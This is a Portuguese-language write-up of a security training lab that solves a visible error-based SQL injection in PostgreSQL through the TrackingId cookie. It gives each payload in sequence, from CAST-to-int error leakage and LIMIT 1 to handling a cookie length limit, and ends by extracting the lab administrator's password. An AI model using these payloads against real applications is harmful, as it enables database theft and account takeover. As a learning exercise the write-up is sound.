# Lab: Visible error-based SQL injection

## Enunciado (traduzido)

Este lab contém uma vulnerabilidade de SQL injection. A aplicação utiliza um cookie de rastreamento (`TrackingId`) para análise de métricas e executa uma consulta SQL contendo o valor do cookie enviado.

Os resultados da consulta SQL não são retornados na página, porém a aplicação exibe mensagens de erro detalhadas (verbosas) do banco de dados em sua resposta.

O banco de dados contém uma tabela chamada `users`, com colunas chamadas `username` e `password`.

Para resolver o lab, utilize uma injeção SQL baseada em erros visíveis (visible error-based) para extrair a senha do usuário `administrator` e faça login com essa conta.

## O que fiz

Iniciamos os testes interceptando o tráfego no Burp Suite e analisando a requisição que envia o cookie `TrackingId`. Para verificar como o backend lida com entradas maliciosas, adicionamos uma aspa simples `'` ao final do valor do cookie:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'
```

A aplicação respondeu com uma mensagem de erro detalhada do PostgreSQL revelando a consulta interna completa e indicando que havia uma string literal não fechada (`unclosed string literal`). 

Isso nos mostrou que a entrada é concatenada diretamente entre aspas na query e que as mensagens de erro do banco são exibidas abertamente na tela.

Para verificar se podíamos controlar o fechamento da consulta, adicionamos caracteres de comentário (`--`) para anular o restante do código original:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'--
```

A requisição retornou `HTTP 200 OK` sem mensagens de erro, confirmando que a sintaxe foi corrigida com sucesso.

### Validando a extração via erro com `CAST` e versão do banco

Para cravar com 100% de certeza que o banco é vulnerável à exfiltração de dados via erro, testamos injetar uma tentativa de conversão da função `version()` para o tipo inteiro (`int`) usando concatenação:

```http
Cookie: TrackingId='||(select cast(version() as int))||'
```

Como o resultado de `version()` é uma string descritiva e não um número, o PostgreSQL quebrou a execução e imprimiu a versão exata do banco dentro do próprio erro:

```text
ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```

Isso comprova que qualquer dado de texto que passarmos dentro do `CAST(... AS int)` será cuspido diretamente na tela através da mensagem de erro.

### Ajustando a tipagem booleana com `AND`

Ao tentar usar o operador `AND` com uma subquery simples:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

A aplicação respondeu com:  
`ERROR: argument of AND must be type boolean, not type integer`

Isso ocorre porque o **PostgreSQL é fortemente tipado**. O operador `AND` exige uma condição booleana (`true` ou `false`). Como o `CAST(... AS int)` retorna um número inteiro, o banco recusa a operação antes de executá-la.

Para resolver essa exigência, transformamos a expressão em uma comparação lógica adicionando `1=`:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

A requisição foi aceita com sucesso (`200 OK`).

### Resolvendo o limite de tamanho do cookie (Truncamento)

Com a estrutura pronta, tentamos extrair o nome de usuário da tabela `users`:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

O servidor voltou a apresentar o erro de aspa não finalizada.

Ao inspecionar a resposta, vimos que a query impressa estava incompleta: ela foi cortada antes de chegar aos traços `--`. Isso significa que o parâmetro do cookie possui um **limite máximo de caracteres**, truncando payloads mais longos.

Para liberar espaço no buffer, removemos o valor original do cookie (`ogAZZfxtOKUELbuJ`) e iniciamos a injeção diretamente com a aspa:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

### Tratando o retorno de múltiplas linhas (`LIMIT 1`)

Com o payload cabendo por completo no buffer, o banco processou a instrução, mas gerou um novo erro:  
`ERROR: more than one row returned by a subquery used as an expression`

A função `CAST()` precisa receber um único valor escalar para tentar a conversão. Como a tabela `users` possui vários usuários cadastrados, o `SELECT username` retornou múltiplas linhas, quebrando a subquery.

Para restringir o resultado a apenas um único registro, adicionamos a cláusula `LIMIT 1`:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Ao processar essa linha, o PostgreSQL tentou converter o texto do primeiro usuário encontrado para inteiro, falhou na conversão e despejou o dado no erro:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

### Extraindo a senha e fazendo o login

Confirmado que o primeiro registro da tabela é o `administrator`, trocamos o campo `username` por `password` mantendo o `LIMIT 1`:

```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

O banco tentou converter a senha em número e disparou a mensagem de erro com a credencial vazada:

```text
ERROR: invalid input syntax for type integer: "107127y3iqlwvdq557i7"
```

Copiamos a senha retornada (`107127y3iqlwvdq557i7`), fomos até `/login`, entramos com a conta `administrator` e concluímos o lab.

---

[⬅ Voltar](../../README.md)